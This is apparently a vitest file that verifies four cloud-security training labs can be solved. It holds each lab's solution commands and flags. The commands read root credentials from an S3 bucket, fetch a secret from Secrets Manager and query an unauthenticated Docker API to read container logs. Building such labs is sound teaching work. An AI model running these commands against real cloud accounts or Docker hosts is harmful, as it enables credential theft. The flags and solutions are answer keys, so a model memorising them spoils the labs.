import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the CLOUD labs batch B14 (part 1):
// cloud-fundamentals, cloud-iam-basics, cloud-privesc-iam, cloud-containers-docker.
const dir = path.resolve(process.cwd(), '../content/labs')

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'cloud-fundamentals',
    wd: '/home/student/cf',
    flag: 'nto{l34k3d_k3y_sh4r3d_r3sp0ns1b1l1ty}',
    check: "grep -q 'nto{' found.txt",
    solution: [
      `aws sts get-caller-identity`,
      `aws s3 ls`,
      `aws s3 cp s3://mycompany-internal-data/root-creds.txt - > found.txt`,
    ],
  },
  {
    id: 'cloud-iam-basics',
    wd: '/home/student/iam',
    flag: 'nto{1am_w1ldc4rd_4dm1n}',
    check: "grep -q 'nto{' found.txt",
    solution: [
      `base64 -d iam-backup.b64 > policies.json`,
      `grep nto policies.json > found.txt`,
    ],
  },
  {
    id: 'cloud-privesc-iam',
    wd: '/home/student/privesc',
    flag: 'nto{cr34t3_p0l1cy_v3rs10n_t0_4dm1n}',
    check: "grep -q 'nto{' found.txt",
    solution: [
      `aws iam list-attached-user-policies --user-name intern-bot`,
      `aws secretsmanager get-secret-value --secret-id prod/flag > found.txt`,
    ],
  },
  {
    id: 'cloud-containers-docker',
    wd: '/home/student/docker',
    flag: 'nto{d0ck3r_4p1_n0_4uth_2_r00t}',
    check: "grep -q 'nto{' found.txt",
    solution: [
      `curl -s http://10.0.0.5:2375/version`,
      `curl -s http://10.0.0.5:2375/containers/json`,
      `curl -s 'http://10.0.0.5:2375/containers/pwn/logs?stdout=1' > found.txt`,
    ],
  },
]

describe.each(LABS)('cloud lab B14: $id', ({ id, wd, flag, check, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: wd, check, hints: ['h', 'h', 'h', 'h'] }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(wd)
    expect(bundle.fs.some((f) => f.path === `${wd}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${wd}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })

  it('check fails on an empty/negative solution', async () => {
    const s = createSession({ spec, bundle })
    await s.run(`echo nope > found.txt`)
    expect((await s.run('check')).code).toBe(1)
  })
})
